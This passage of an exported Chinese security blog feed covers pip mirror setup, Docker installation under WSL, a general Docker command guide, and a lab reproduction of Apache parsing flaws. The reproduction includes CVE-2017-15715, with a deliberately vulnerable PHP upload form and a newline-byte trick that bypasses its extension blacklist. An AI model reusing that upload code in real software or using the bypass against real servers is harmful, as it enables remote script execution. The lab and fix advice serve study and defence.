timeout = 1000
[install]
use-mirrors = true
mirrors = https://pypi.doubanio.com//
EOF</code></pre><p>windows 在 C:\Users\name\pip 新建一个pip.ini 这里name是用户名（<strong>文件中的中文注释要去掉</strong>）</p>
<pre><code>[global]
index-url = https://pypi.douban.com/simple
trusted-host = pypi.douban.com        #添加豆瓣为可信主机，要不然可能报错
disable-pip-version-check = true    #取消pip版本检查，排除每次都报最新的pip
timeout = 120</code></pre><h3 id="6-4-3-升级所有第三方包"><a href="#6-4-3-升级所有第三方包" class="headerlink" title="6.4.3 升级所有第三方包"></a>6.4.3 升级所有第三方包</h3><pre><code>pip list --outdated | grep &apos;^[a-z]* (&apos; | cut -d &quot; &quot; -f 1 | xargs pip install -U </code></pre><h2 id="几个开源镜像地址："><a href="#几个开源镜像地址：" class="headerlink" title="几个开源镜像地址："></a>几个开源镜像地址：</h2><p><a href="http://mirrors.163.com/" target="_blank" rel="noopener">http://mirrors.163.com/</a></p>
<p><a href="https://developer.aliyun.com/mirror/" target="_blank" rel="noopener">https://developer.aliyun.com/mirror/</a></p>
<p><a href="https://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/</a></p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>问题解决，备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10系统Ubuntu安装docker</title>
    <url>/2020/04/05/Win10%E5%AD%90%E7%B3%BB%E7%BB%9FUbuntu%E5%AE%89%E8%A3%85docker/</url>
    <content><![CDATA[<p>对于在Windows10子系统Ubuntu安装docker遇到的一些问题记录<a id="more"></a></p>
<h1 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h1><p>通过 Docker 的简单使用指南可以成功的安装docker，但是在Win10子系统Ubuntu下，安装完后执行”docker version”却发现只有”client”没有”server”。</p>
<pre><code>yang@DESKTOP-610CBGS:/mnt/c/Users/y1385$ docker version
Client: Docker Engine - Community
 Version:   19.03.8
 API version:   1.40
 Go version:go1.12.17
 Git commit:afacb8b7f0
 Built: Wed Mar 11 01:25:46 2020
 OS/Arch:   linux/amd64
 Experimental:  false
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></pre><p>通过查阅资料我们可以知道Windows下的Ubuntu是不能直接安装docker。</p>
<h1 id="问题解决："><a href="#问题解决：" class="headerlink" title="问题解决："></a>问题解决：</h1><h2 id="安装-docker-toolbox"><a href="#安装-docker-toolbox" class="headerlink" title="安装 docker toolbox"></a>安装 docker toolbox</h2><p>由于我的系统是Windows家庭版的。不能安装Docker Desktop，所以我这里使用的docker toolbox。</p>
<h3 id="下载toolbox"><a href="#下载toolbox" class="headerlink" title="下载toolbox"></a>下载toolbox</h3><p><a href="http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/" target="_blank" rel="noopener">http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/</a></p>
<p>点上面的aliyun链接之后选择一个DockerToolbox-x.x.x-ce.exe版本安装。之后无脑下一步即可。</p>
<h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h3><p>安装完成之后双击桌面的docker图标，页面打印信息说Boot2Docker的版本不合适，得重新下载，然后就一直下载，最后要么卡死在下载环节，要么下载完了也无法看到大鲸鱼。</p>
<p>但是其实boot2docker这个文件根本不需要下载。</p>
<p>所以我们只需要删除default的machine（用户cmd命令切换到toolbox的安装目录，默认为：C:\Program Files\Docker Toolbox）之后。</p>
<pre><code>docker-machine ls # 查看当前的docker虚拟机</code></pre><p><img src="https://i.imgur.com/ef1R6uk.png" alt=""></p>
<p>如果STATE是Error说明有问题。</p>
<pre><code>docker-machine rm default #删除docker虚拟机

docker-machine create --driver virtualbox --virtualbox-boot2docker-url=boot2docker.iso default #重新创建

docker-machine ls # 查看当前的docker虚拟机</code></pre><p><img src="https://i.imgur.com/svSklPA.png" alt=""></p>
<p>如果STATE是Running说明是正常的。</p>
<h3 id="配置阿里云加速"><a href="#配置阿里云加速" class="headerlink" title="配置阿里云加速"></a>配置阿里云加速</h3><p><a href="https://account.aliyun.com/" target="_blank" rel="noopener">点这里</a>去申请一个镜像加速地址，在我另外一篇docker简单指南有介绍到。</p>
<pre><code>docker-machine stop default #停止docker虚拟机
docker-machine rm default
docker-machine create --driver virtualbox --virtualbox-boot2docker-url=boot2docker.iso --engine-registry-mirror=https://o7ch5p59.mirror.aliyuncs.com default    # 最后的xxxo7ch5p59需要换成你特有的阿里云加速
docker info </code></pre><h3 id="修改镜像文件存储位置"><a href="#修改镜像文件存储位置" class="headerlink" title="修改镜像文件存储位置"></a>修改镜像文件存储位置</h3><pre><code>docker-machine stop default #停止docker虚拟机</code></pre><p>在桌面双击启动Oracle VM VirtualBox，Ctrl+D 打开虚拟介质管理，选中disk.vmdk，点复制，然后一路next到最后一步填新的目录，保存为disk_new.vdi<br><img src="https://i.imgur.com/jUDvW6A.png" alt=""></p>
<p><img src="https://i.imgur.com/Deu8MnU.png" alt=""></p>
<p>点击存储，控制器右上角添加新的虚拟硬盘就行了。</p>
<p><img src="https://i.imgur.com/UtkHcF2.png" alt=""></p>
<p>之后重启点击桌面的docker启动</p>
<p><img src="https://i.imgur.com/RQemcUO.png" alt=""></p>
<p><strong>到这里出现鲸鱼说明toolbox安装成功。</strong></p>
<h2 id="Ubuntu连接到-toolbox的docker"><a href="#Ubuntu连接到-toolbox的docker" class="headerlink" title="Ubuntu连接到 toolbox的docker"></a>Ubuntu连接到 toolbox的docker</h2><pre><code># 在cmd中执行
docker-machine env default</code></pre><p><img src="https://i.imgur.com/DWOC44S.png" alt=""></p>
<pre><code># 得到类似的以下输出：
export DOCKER_TLS_VERIFY=&quot;1&quot;
export DOCKER_HOST=&quot;tcp://192.168.99.100:2376&quot;
export DOCKER_CERT_PATH=&quot;C:\Users\用户名\.docker\machine\machines\default&quot;
export DOCKER_MACHINE_NAME=&quot;default&quot;
export COMPOSE_CONVERT_WINDOWS_PATHS=&quot;true&quot;</code></pre><p>到Ubuntu中修改~/.profile(其他linux登陆自动执行的文件也可以)</p>
<pre><code># 在文件后面添加如下：
export DOCKER_HOST=192.168.99.100:2376
export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH=/mnt/c/Users/用户名/.docker/machine/machines/default/
export DOCKER_MACHINE_NAME=default
export COMPOSE_CONVERT_WINDOWS_PATHS=true</code></pre><p>第三行的用户名记得根据”docker-machine env default”显示来添加。之后</p>
<pre><code>source ~/.profile</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><pre><code># 在Ubuntu中输入
docker version

# 显示：
Client: Docker Engine - Community
 Version:   19.03.8
 API version:   1.37 (downgraded from 1.40)
 Go version:go1.12.17
 Git commit:afacb8b7f0
 Built: Wed Mar 11 01:25:46 2020
 OS/Arch:   linux/amd64
 Experimental:  false

Server:
 Engine:
  Version:  18.03.0-ce
  API version:  1.37 (minimum version 1.12)
  Go version:   go1.9.4
  Git commit:   0520e24
  Built:Wed Mar 21 23:14:54 2018
  OS/Arch:  linux/amd64
  Experimental: false</code></pre><p>说明我们安装成功了，我们测试一下</p>
<pre><code>docker search hello</code></pre><p><em>如果你不幸出现如下的问题：</em></p>
<pre><code>Error response from daemon: Get https://index.docker.io/v1/search?q=mysql&amp;n=25: dial tcp: lookup index.docker.io on 10.0.2.3:53: read udp 10.0.2.15:47946-&gt;10.0.2.3:53: i/o timeout</code></pre><p>那么你只需要回到安装docker toolbox重新安装即可。</p>
<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>这个文章记录了我在Windows10的Ubuntu安装docker的一些问题解决，最后得出，这不是一个好的选择，由于一些docker对Windows支持的原因出现了各种各样的问题，这里由于我的Windows不是pro版的，所以不能使用docker desktop for windows更加麻烦。这篇文章是发表于2020-04-05日，所以，如果你也遇到问题的话，希望可以给你参考，因为随着时间的推移方法不一定有效，但是思路是不变的。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
</li>
<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>docker,问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker的简单使用指南</title>
    <url>/2020/04/05/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>主要是从docker的安装到具体应用简单指南<a id="more"></a></p>
<h1 id="Docker-简介"><a href="#Docker-简介" class="headerlink" title="Docker 简介"></a>Docker 简介</h1><blockquote>
<p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p>
</blockquote>
<p>把Docker比喻做货物运输中的“集装箱”，那么我们都知道集装箱在运输过程中免去了重复装卸的过程，大大节省了人力物力的同时一辆运输工具可以重复使用不同的集装箱。那么对于Docker来说可以也是这样，免去重复安装卸载环境的过程，并且因为重复利用内核文件，大大节省了空间。</p>
<p><a href="https://www.docker.com/" target="_blank" rel="noopener">更多关于docker的信息 . . . </a></p>
<hr>
<h1 id="Docker-初始化"><a href="#Docker-初始化" class="headerlink" title="Docker 初始化"></a>Docker 初始化</h1><h2 id="Docker-CE-安装"><a href="#Docker-CE-安装" class="headerlink" title="Docker CE 安装"></a>Docker CE 安装</h2><p><a href="https://developer.aliyun.com/mirror/" target="_blank" rel="noopener">https://developer.aliyun.com/mirror/</a></p>
<p>打开上面的链接 选择容器 选择docker-ce</p>
<h3 id="Ubuntu-16-04-18-04（使用-apt-get-进行安装）"><a href="#Ubuntu-16-04-18-04（使用-apt-get-进行安装）" class="headerlink" title="Ubuntu 16.04/18.04（使用 apt-get 进行安装）"></a>Ubuntu 16.04/18.04（使用 apt-get 进行安装）</h3><pre><code># step 1: 安装必要的一些系统工具
sudo apt-get update
sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common
# step 2: 安装GPG证书
curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
# Step 3: 写入软件源信息
sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;
# Step 4: 更新并安装Docker-CE
sudo apt-get -y update
sudo apt-get -y install docker-ce

# 安装指定版本的Docker-CE:
# Step 1: 查找Docker-CE的版本:
# apt-cache madison docker-ce
#   docker-ce | 17.03.1~ce-0~ubuntu-xenial | https://mirrors.aliyun.com/docker-ce/linux/ubuntu xenial/stable amd64 Packages
#   docker-ce | 17.03.0~ce-0~ubuntu-xenial | https://mirrors.aliyun.com/docker-ce/linux/ubuntu xenial/stable amd64 Packages
# Step 2: 安装指定版本的Docker-CE: (VERSION例如上面的17.03.1~ce-0~ubuntu-xenial)
# sudo apt-get -y install docker-ce=[VERSION]</code></pre><h3 id="CentOS-7（使用-yum-进行安装）"><a href="#CentOS-7（使用-yum-进行安装）" class="headerlink" title="CentOS 7（使用 yum 进行安装）"></a>CentOS 7（使用 yum 进行安装）</h3><pre><code># step 1: 安装必要的一些系统工具
sudo yum install -y yum-utils device-mapper-persistent-data lvm2
# Step 2: 添加软件源信息
sudo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
# Step 3: 更新并安装Docker-CE
sudo yum makecache fast
sudo yum -y install docker-ce
# Step 4: 开启Docker服务
sudo service docker start

# 注意：
# 官方软件源默认启用了最新的软件，您可以通过编辑软件源的方式获取各个版本的软件包。例如官方并没有将测试版本的软件源置为可用，您可以通过以下方式开启。同理可以开启各种测试版本等。
# vim /etc/yum.repos.d/docker-ee.repo
#   将[docker-ce-test]下方的enabled=0修改为enabled=1
#
# 安装指定版本的Docker-CE:
# Step 1: 查找Docker-CE的版本:
# yum list docker-ce.x86_64 --showduplicates | sort -r
#   Loading mirror speeds from cached hostfile
#   Loaded plugins: branch, fastestmirror, langpacks
#   docker-ce.x86_6417.03.1.ce-1.el7.centosdocker-ce-stable
#   docker-ce.x86_6417.03.1.ce-1.el7.centos@docker-ce-stable
#   docker-ce.x86_6417.03.0.ce-1.el7.centosdocker-ce-stable
#   Available Packages
# Step2: 安装指定版本的Docker-CE: (VERSION例如上面的17.03.0.ce.1-1.el7.centos)
# sudo yum -y install docker-ce-[VERSION]</code></pre><h3 id="安装校验"><a href="#安装校验" class="headerlink" title="安装校验"></a>安装校验</h3><pre><code>root@iZbp12adskpuoxodbkqzjfZ:$ docker version
Client:
 Version:  17.03.0-ce
 API version:  1.26
 Go version:   go1.7.5
 Git commit:   3a232c8
 Built:Tue Feb 28 07:52:04 2017
 OS/Arch:  linux/amd64

Server:
 Version:  17.03.0-ce
 API version:  1.26 (minimum version 1.12)
 Go version:   go1.7.5
 Git commit:   3a232c8
 Built:Tue Feb 28 07:52:04 2017
 OS/Arch:  linux/amd64
 Experimental: false</code></pre><h2 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h2><p>完成上面的步骤之后。选择右上角的控制台 在搜索框输入“容器镜像服务”找到镜像加速服务即可。</p>
<p>针对Docker客户端版本大于 1.10.0 的用户</p>
<p>您可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器</p>
<pre><code># Ubuntu\Centos
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;
{
  &quot;registry-mirrors&quot;: [&quot;https://o7ch5p59.mirror.aliyuncs.com&quot;]    #阿里镜像
  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]    #网易镜像
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker</code></pre><hr>
<h1 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker 命令"></a>Docker 命令</h1><p>docker官方文档：<a href="https://docs.docker.com/install/" target="_blank" rel="noopener">https://docs.docker.com/install/</a></p>
<p>docker教程|菜鸟教程：<a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-command-manual.html</a></p>
<h2 id="服务相关命令"><a href="#服务相关命令" class="headerlink" title="服务相关命令"></a>服务相关命令</h2><pre><code># 启动docker服务：
systemctl start docker

# 停止docker服务：
systemctl stop docker

# 重启docker服务：
systemctl restart docker

# 查看docker状态：
systemctl status docker

# 设置开机启动docker服务：
systemctl enable docker</code></pre><h2 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h2><pre><code>#查看镜像：查看本地所有的镜像
docker images 
docker images -q #查看所用镜像的id

#搜索镜像：从网络中查找需要的镜像
docker search 镜像名称

#拉取镜像：从Docker仓库下载镜像到本地，镜像名称格式为名称版本号，如果版本号不指定则是最新的版本。
如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。
docker pull 镜像名称

#删除镜像：删除本地镜像
docker rmi 镜像id #剧除指定本地镜像
docken rmi &apos;docker images -q&apos; #删除所有本地镜像</code></pre><p><a href="https://hub.docker.com/" target="_blank" rel="noopener">docker hub</a> </p>
<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/images" target="_blank" rel="noopener">阿里云容器镜像服务</a></p>
<h2 id="容器相关命令1"><a href="#容器相关命令1" class="headerlink" title="容器相关命令1"></a>容器相关命令1</h2><pre><code>#查看容器
docker ps #查看正在运行的容器
docker ps -a #查看所有容器

#创建并启动容器
docker run 参数</code></pre><p>-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，<strong>退出容器后，容器自动关闭。</strong></p>
<p>-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</p>
<p>-d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker exec进入容器。<strong>退出后，容器不会关闭。</strong></p>
<p>-it 创建的容器一般称为交互式容器，-id 创建的容器一般称为守护式容器</p>
<p>–name：为创建的容器命名。</p>
<h2 id="容器相关命令2"><a href="#容器相关命令2" class="headerlink" title="容器相关命令2"></a>容器相关命令2</h2><pre><code># 进入容器
docker exec 参数 #退出容器，容器不会关闭

# 停止容器
docker stop 容器名称

# 启动容器
docker start 容器名称

# 删除容器：如果容器是运行状态则删除失败，需要停止容器才能删除
docker rm 容器名称 

#docker rm $(docker ps -aq)  删除所有容器

# 查看容器信息
docker inspect 容器名称</code></pre><hr>
<h1 id="Docker容器数据卷"><a href="#Docker容器数据卷" class="headerlink" title="Docker容器数据卷"></a>Docker容器数据卷</h1><p>简单理解：容器器数据卷是为了，解决在宿主机和容器之间的文件共享，或者是容器和容器之间文件共享，使用数据卷的方式可以快速的实现这个需求。</p>
<h2 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h2><pre><code>#创建启动容器时，使用 -v参数设置数据卷
docker run -v 宿主机目录(文件):容器内目录(文件)</code></pre><p>注意事项：</p>
<p>1.目录必须是绝对路径</p>
<p>2.如果目录不存在，会自动创建</p>
<p>3.可以挂载多个数据卷</p>
<pre><code>## 配置数据卷容器

# 1.创建启动c3数据卷容器，使用-v参数 设置数据卷
docker run -it --name=c3 -v/volume centos:7 /bin/bash

# 2.创建启动c1、c2容器，使用 --volumes-from 参数设置数据卷
docker run -it --name=cl --volumes-from c3 centos：7/bin/bash 
docker run -it --name=c2 --volumes-from c3 centos：7/bin/bash</code></pre><hr>
<h1 id="Docker-Dockerfile"><a href="#Docker-Dockerfile" class="headerlink" title="Docker Dockerfile"></a>Docker Dockerfile</h1><p>要使用Dockerfile来构建镜像文本文件，需要简单了解docker镜像加载原理”Docker的镜像实际上由一层一层的文件系统组成”下面的图片就很形象的表示出来：</p>
<p><img src="https://i.imgur.com/opbTBvZ.png" alt=""></p>
<h2 id="容器转为镜像"><a href="#容器转为镜像" class="headerlink" title="容器转为镜像"></a>容器转为镜像</h2><pre><code>docker commit 容器id镜像名称:版本号
docker save -o 压缩文件名称镜像名称:版本号
docker load -i 压缩文件名称</code></pre><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>参考：<a href="https://www.runoob.com/docker/docker-dockerfile.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-dockerfile.html</a></p>
<hr>
<h1 id="Docker-实例"><a href="#Docker-实例" class="headerlink" title="Docker 实例"></a>Docker 实例</h1><h2 id="Docker安装-Kali"><a href="#Docker安装-Kali" class="headerlink" title="Docker安装 Kali"></a>Docker安装 Kali</h2><p>1、查看可用kali linux版本</p>
<p><img src="https://i.imgur.com/ru3i9p7.png" alt=""></p>
<p>2、拉取指定版本的kali</p>
<pre><code>docker pull kalilinux/kali-rolling:latest</code></pre><p>3、查看本地镜像</p>
<pre><code>docker images</code></pre><p><img src="https://i.imgur.com/DzLakXA.png" alt=""></p>
<p>4、运行容器</p>
<pre><code># -d表示以后台运行，指定name为mykali
docker run -id --name mykali kalilinux/kali-rolling:latest

# exec进入kali容器
docker exec -it mykali /bin/bash</code></pre><p><img src="https://i.imgur.com/fqSGjlu.png" alt=""></p>
<p>安装完这个kali官方镜像，里面啥也没有，你可以参考<a href="https://nightmorning.site/wordpress/?p=364" target="_blank" rel="noopener">https://nightmorning.site/wordpress/?p=364</a>这篇，或者直接pull一个别人已经做好的镜像。另外Centos和Ubuntu的安装方法和Kali大同小异，这里就不再赘述。</p>
<h2 id="Docker-安装MySql"><a href="#Docker-安装MySql" class="headerlink" title="Docker 安装MySql"></a>Docker 安装MySql</h2><p>1、search mysql 镜像</p>
<pre><code>docker search mysql</code></pre><p>2、拉取最新版本的mysql</p>
<pre><code>docker pull mysql</code></pre><p>3、创建容器、设置端口映射、目录映射</p>
<pre><code># 创建/root/mysql用来存储mysql数据信息
mkdir ~/mysql &amp;&amp; cd ~/mysql

docker run -id \
-p 3308:3306 \
--name=mymysql \
-v $PWD/conf:/etc/mysql/conf.d \
-v $PWD/log:/logs \
-v $PWD/data:/var/lib/mysql \
-e MYSQL_ROOT_PASSWORD=toor \
mysql:latest</code></pre><p><em>参数说明：</em></p>
<ul>
<li>-p 3308:3306：    容器的3306端口映射到宿主机的3308端口。</li>
<li>-v $PWD/conf:/etc/mysql/conf.d：将宿主机的 当前目录/conf挂载到容器的/etc/mysql/conf.d <strong>配置目录</strong></li>
<li>-v $PWD/log:/logs：<strong>日志目录</strong></li>
<li>-v $PWD/data:/var/lib/mysql：<strong>数据目录</strong></li>
<li>-e MYSQL_ROOT_PASSWORD=toor：初始化root密码为toor</li>
</ul>
<p><img src="https://i.imgur.com/1gcl36B.png" alt=""></p>
<p>创建完成之后，我们用Navicat去连接宿主机的3308端口试一下。</p>
<p><img src="https://i.imgur.com/5USWENV.png" alt=""></p>
<pre><code>#如果出现“2059 - authentication plugin &apos;caching_sha2_password&apos; ...&quot;可以尝试下面这个更改验证插件。
ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;toor&apos;;</code></pre><p>连接成功了</p>
<p><img src="https://i.imgur.com/hJQ8GfW.png" alt=""></p>
<h2 id="Docker-安装Tomcat"><a href="#Docker-安装Tomcat" class="headerlink" title="Docker 安装Tomcat"></a>Docker 安装Tomcat</h2><p>1、search Tomcat 镜像</p>
<pre><code>docker search tomcat</code></pre><p>2、拉取最新版本的Tomcat</p>
<pre><code>docker pull Tomcat</code></pre><p>3、创建容器、设置端口映射、目录映射</p>
<pre><code># 创建/root/tomcat用来存储tomcat数据信息
mkdir ~/tomcat &amp;&amp; cd ~/tomcat

docker run -id --name mytomcat \
-p 8080:8080 \
-v $PWD:/usr/local/tomcat/webapps \
tomcat:latest</code></pre><p>4、测试</p>
<p><img src="https://i.imgur.com/Ji1L9WI.png" alt=""></p>
<p>如果你访问时出现”HTTP Status 404 – 未找到”可以参考这篇：<a href="https://blog.csdn.net/qq_32565267/article/details/104460212" target="_blank" rel="noopener">https://blog.csdn.net/qq_32565267/article/details/104460212</a></p>
<h2 id="Docker-安装Nginx"><a href="#Docker-安装Nginx" class="headerlink" title="Docker 安装Nginx"></a>Docker 安装Nginx</h2><p>1、search Nginx 镜像</p>
<pre><code>docker search Nginx</code></pre><p>2、拉取最新版本的Nginx</p>
<pre><code>docker pull Nginx</code></pre><p>3、创建容器、设置端口映射、目录映射</p>
<pre><code># 创建~/nginx用来存储nginx数据信息
mkdir -p ~/nginx/conf &amp;&amp; cd ~/nginx

docker run -id --name mynginx \
-p 80:80 \
-v $PWD/conf/nginx.conf:/etc/nginx/mginx.conf \
-v $PWD/logs:/var/log/nginx \
-v $PWD/html:/usr/share/nginx/html \
nginx:latest</code></pre><p>4、测试：</p>
<p>在/nginx/html/新建一个index.html的文件</p>
<pre><code>tee ~/nginx/html/index.html &lt;&lt;-&apos;EOF&apos;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Mydocker&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;Docker Nginx test !!! &lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.17.9&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
EOF</code></pre><p><img src="https://i.imgur.com/NP5H2D9.png" alt=""></p>
<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>docker一出来就很火，但是网上的教程鱼龙混杂，所以整理了一下docker的简单使用使用指南，初心是为了方便自己使用，因为在渗透过程中难免会出现，搭建各种不同版本的服务来测试。用docker可以大大的提高效率，简直不要太方便了。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
</li>
<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞之Apach解析漏洞（记录）</title>
    <url>/2020/04/04/Apach%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>中间件Apach解析漏洞记录<a id="more"></a></p>
<h1 id="Apache简介："><a href="#Apache简介：" class="headerlink" title="Apache简介："></a>Apache简介：</h1><blockquote>
<p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台被广泛使用，是最流行的Web服务器端软件之一。同时Apache的漏洞也层出不穷，甚至Struts2安全漏洞频出 ，也和Apache官方代码有关。所以我们这次要对Apache一些解析漏洞复现，希望可以得到一些启发。</p>
</blockquote>
<h1 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h1><h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p>这个解析漏洞是根据Apache的一个特性：Apache从最右边后缀开始识别，如果该后缀无法识别（即不在mine.types文件中），就会继续向右识别，直到识别成功才解析。</p>
<pre><code>e.g:phpinfo.php.test 解析为：phpinfo.php</code></pre><p><img src="https://i.imgur.com/VaPZ9Sf.png" alt=""></p>
<p>值得注意的是：在实际的应用中，可以通过上传”php.xxx”应用，但是不能上传”php.jpg”因为jpg在mine.types中就会识别成jpg图片文件。</p>
<h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>在上面的解析漏洞中，jpg会被识别</p>
<p>但是，如果运维人员给.php后缀增加了处理器：</p>
<pre><code>AddHandler application/x-httpd-php .php</code></pre><p>我们在http.conf增加上面的处理器（之后重启server）</p>
<p><img src="https://i.imgur.com/rrhQ5wY.png" alt=""></p>
<p><img src="https://i.imgur.com/ODVHLi1.png" alt=""></p>
<p><img src="https://i.imgur.com/RkutvuH.png" alt=""></p>
<p>那么只要文件名中含有.php后缀，即被识别成PHP文件</p>
<p>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<h2 id="HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="HTTPD 换行解析漏洞（CVE-2017-15715）"></a>HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>1、影响范围：2.4.0~2.4.29版本(在Windows下，不允许以换行符文件结尾的后缀，所以Windows服务器无法利用。)</p>
<p><strong>2、复现过程：</strong></p>
<p><em>1、通过docker拉取一个Apache版本在2.4.0~2.4.29之间的。我这里用的是Apache 2.4.10</em></p>
<p><img src="https://i.imgur.com/azGA6xv.png" alt=""></p>
<pre><code>#拉取一个apache+php的docker镜像
docker pull webimp/php-55-apache:latest</code></pre><p><em>2、启动docker</em></p>
<pre><code>#创建存放Apache的目录
mkdir apache2
#守护启动，并且将本机的80和容器的80做端口映射、配置数据卷
docker run -id -p 80:80 -v $PWD/www/html:/var/www/html</code></pre><p><em>3、编写测试代码放在本机的$PWD/www/html/index.php</em></p>
<pre><code>&lt;html&gt;
&lt;body&gt;
    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;
    &lt;input type=&quot;submit&quot; value=&quot;uploadfile&quot; /&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
if(isset($_FILES[&apos;file&apos;])) {
    $name = basename($_POST[&apos;name&apos;]);
    $ext = pathinfo($name,PATHINFO_EXTENSION);
    if(in_array($ext, [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;])) {
        exit(&apos;bad file&apos;);
    }
    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], &apos;./&apos; . $name);
}</code></pre><p><em>4、在下面页面用burp抓包进行分析：</em></p>
<p><img src="https://i.imgur.com/s5AARRo.png" alt=""></p>
<p>在phpinfo.php后面添加一个“.”之后到Hex<br><img src="https://i.imgur.com/aOUmJgv.png" alt=""></p>
<p>将2e（表示.）改为0a（表示换行），之后上传即可。<br><img src="https://i.imgur.com/JWifqDX.png" alt=""></p>
<p>我们可以看到上传成功了，phpinfo正常解析。<br><img src="https://i.imgur.com/IJbZmgX.png" alt=""></p>
<p><img src="https://i.imgur.com/kSBQOPY.png" alt=""></p>
<p>3、参考：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p>
<p><strong>解析漏洞修复建议</strong></p>
<pre><code>1. 升级到最新版本
2. 将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</code></pre><h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>通过总结上面的Apache解析漏洞可以在实战中过程中应用更加的得心应手。一般这些漏洞可能会出现在“及其隐蔽的子域中”，所以我们要耐心观察版本，加以应用。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
